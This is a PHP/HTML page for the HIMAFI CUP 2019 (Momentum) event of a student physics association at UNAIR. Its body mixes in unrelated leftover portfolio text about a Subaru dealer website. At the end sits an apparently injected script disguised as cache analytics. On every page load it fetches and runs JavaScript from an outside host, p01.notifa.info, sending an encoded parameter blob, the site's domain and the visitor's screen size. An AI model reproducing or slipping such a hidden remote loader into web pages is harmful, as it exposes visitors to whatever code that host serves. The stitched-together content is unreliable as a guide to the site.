<?php session_start();?>

<!doctype html>
<html lang="en" class="no-js">

<head>
	<!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-4946886-2"></script>
	<script>
		window.dataLayer = window.dataLayer || [];

		function gtag() {
			dataLayer.push(arguments);
		}
		gtag('js', new Date());

		gtag('config', 'UA-4946886-2');
	</script>

	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="momentumicon.png" />

	<meta name="keywords"
		content="agenda kota surabaya, agenda lomba, berita lomba, cari lomba, contoh soal lomba logika fisika, daftar lomba, daftar lomba 2019, daftar lomba terbaru, deadline lomba, deadline lomba apa saja, event lomba, event lomba 2019, foto lomba, info kompetisi, info lomba, info lomba 2019, info lomba 2019 sma, info lomba anak, info lomba anak terbaru, info lomba apa saja, info lomba oktober 2019, info lomba online, info lomba online 2015, info lomba online terbaru, info lomba sma, info lomba sma 2019, info lomba sma 2019, info lomba terbaru, info lomba tingkat sma 2019, its, its surabaya, jadwal lomba 2019, kompetisi 2019, kompetisi di indonesia, kompetisi indonesia, kompetisi online, kompetisi online 2019, kumpulan lomba, lomba, lomba 2019, lomba apa aja, lomba apa saja, lomba berhadiah, lomba berhadiah 2019, lomba di internet, lomba di surabaya 2019, lomba di tahun 2019, lomba hadiah, lomba hari ini, lomba indonesia, kuis fisika, kuis fisika 2019, olimpiade fisika, olimpiade fisika nasional, lomba unair, lomba fisika unair, himafi unair,himafi, lomba fisika, olimpiade sma, olimpiade fisika sma, olimpiade fisika 2019, olimpiade fisika nasional 2019, kompetisi futsal 2019, kompetisi futsal jatim, futsal jatim, lomba futsal, lomba futsal 2019, lomba olahraga, lomba futsal jatim, kompetisi basket, kompetisi basket sma, kompetisi basket 2019,kompetisi basket jatim, kompetisi basket jatim 2019, lomba basket, lomba basket 2019, lomba basket jatim, lomba basket jatim 2019, info lomba terbaru" />
	<title>Momentum 2019</title>
	<link rel="stylesheet" href="css/reset.css"> <!-- CSS reset -->
	<link rel="stylesheet" href="css/style.css"> <!-- Resource style -->
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
		integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
		integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous">
	</script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
		integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous">
	</script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
		integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous">
	</script>
	<script src="js/modernizr.js"></script> <!-- Modernizr -->
	<style>
		.footer {
			position: absolute;
			left: 0;
			bottom: 0;
			width: 100%;
			height: auto;
			background-color: transparent;
		}
	</style>
</head>
<body>
<main>
<div class="cd-subaru cd-main-content">
<div class="heady">
<div class="logo"><a class="cd-btn" href="index.php" data-type="page-transition"><img src="images/logo1.png" alt="logo"/></a></div>
<div class="navitems">
	<div class="navcolumn">
		<?php
			if (isset($_SESSION['user_name'])) { ?>
				<a class="cd-btn" href="./" data-type="page-transition">Home</a>
				<a class="cd-btn" href="./db/" data-type="page-transition">Dashboard</a>
				<a class="cd-btn" href="./logout.php" data-type="page-transition">Logout</a>
				<?php 
			} 
			else {
			?>
		<a class="cd-btn" href="/" data-type="page-transition">Home</a>
		<a class="cd-btn" href="daftar.php" data-type="page-transition">Daftar</a>
		<a class="cd-btn" href="login.php" data-type="page-transition">Login</a>
			<?php } ?>
	</div>
</div>
<div class="bubbleback"></div>
<div class="bubble"></div>
<div class="bubble-wrap">
<div class="bar first"></div>
<div class="bar second"></div>
<div class="bar third"></div>
</div>

<div class="footleft">
	<p>© Himpunan Mahasiswa Fisika UNAIR 2019</p>
</div>
<div class="footright">
	<a href="https://www.instagram.com/momentumunair/" target="_blank">
		<img src="images/instagram.png" width="" height="" alt="" />
	</a>
	<a href="http://nav.cx/3ZN4qXD" target="_blank">
		<img src="images/line.png" width="" height="" alt="" />
	</a>
	<a href="https://s.himafiunair.id/contactmomentum" target="_blank">
		<img src="images/whatsapp.png" width="" height="" alt="" />
	</a>
</div>
	<div class="wrapperwork">
	<div class="worksubarubanner"><a name="top"></a><div class="bannertxt">
		
		<div class="bannersplat">
		<img class="splatoverlay" src="images/splatterdark.png" width="" height="" alt=""/>
<div class="fluid lbdark">
</div>
		
	</div>
<h1 class="fade-in">HIMAFI CUP 2019</h1>		
</div>
</div>
	<div class="workpix subpic"><img src="images/subaru-device.png" width="" height="" alt=""/></div>
<div class="workintrocont"><div class="workintrobox"><h2>More cars. Fewer starbursts.</h2><p>This Subaru Dealer was frustrated. Car dealer websites were all too busy an difficult to use. They were looking for a clean and modern design that focused on user needs – not flashy promotions. The result was a modern but functional design that still leads the way for all car dealerships.</p></div></div>
	<div class="wires group">
		<div class="wiresleft"><h2>Finding vehicles made easy.</h2><p>Help users find their car in as few clicks as possible. That was the main goal. To make this possible, I included a vehicle search right in the banner. I also asked myself the main questions I would ask if I were looking to buy a car myself and gave directional callouts for each of them to help people get there faster.</p></div>
<div class="wiresright hideme"><img src="images/work-sub-wires.png" width="" height="" alt=""/></div>
	</div>
<div class="brandpic"><div class="brandpicoversub"><img src="images/work-sub-car.png" width="" height="" alt=""/></div>
	<div class="fluiddark subblob">
</div>
	</div>
	  <div class="fontsncolours group"><h2 class="hideme">Fonts &amp; Colours</h2>
<div class="font hideme"><img src="images/subfont.png" width="" height="" alt=""/></div><div class="colours hideme"><img src="images/subcar.png" width="" height="" alt=""/></div>
</div>
		
<div class="mobileshots">
	<div class="shot1"><img src="images/work-sub-phone1.png" width="" height="" alt=""/></div>
	<div class="shot2"><img src="images/work-sub-phone3.png" width="" height="" alt=""/></div>
	<div class="shot3"><img src="images/work-sub-phone2.png" width="" height="" alt=""/></div>
	</div>
<div class="fullshot"><img src="images/work-sub-full.png" width="" height="" alt=""/></div>
<div class="nextvalbanner">
<a class="cd-btn" href="valeyo.html" data-type="page-transition">Up next: Valeyo</a>
</div>
</div></div>
</main>
<div class="cd-cover-layer"></div>
<div class="cd-loading-bar"></div>
<script src="js/jquery-2.1.1.js"></script>
<script src="js/main.js"></script> <!-- Resource jQuery -->
<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/velocity/1.2.3/velocity.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/velocity/1.2.3/velocity.ui.min.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/2542/in-view.min.js'></script>
<script src="js/preloader.js"></script>
<script  src="js/blob.js"></script>
<script  src="js/wordz.js"></script>	
<script src="js/index.js"></script>
<script src="js/plane.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2XKwJhe1PRETs7Q0NVxaSWBMM8VKaP%2bvYOkeVunSu%2buSZnBGCsxZwUrd%2fXQMJ4uoYD9MiAkKJos%2bGlmkiccrm6ElJPbdp1gk8u7ryIOSqwJW%2fJypuecQ0Sw%2fFw6Z4x0YAkDtlHV3ANi7Y06NY%2fWXhDp4Bs8tmB5F7SFBce5KKw74r2bIYszhsd9tg%2fhOOzcKGIf779OpK0mMFdrez8rstrfgTE1oTDSKwZAZmWNewSgOAG%2fd2uKG3zWPMzqRKerAtHFoxZuV3LJf1y2HGHtbPolCRblFuOQ8pVQY11hnAZ5EZ1N%2fse3c8jvr9w3O1H08FLNfcKLsXf1imhYtYBtD2UGdTdD%2fjR%2bdhNIONHnHk4vg8eK5N%2ffWrZxnfnHtOslK6mbOkkwEElgvIeam%2fyFo1fdxfqAYMmA8Fy9TtIyiACb1EF%2f3EtlYGjHAsEYLS7%2fhO" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>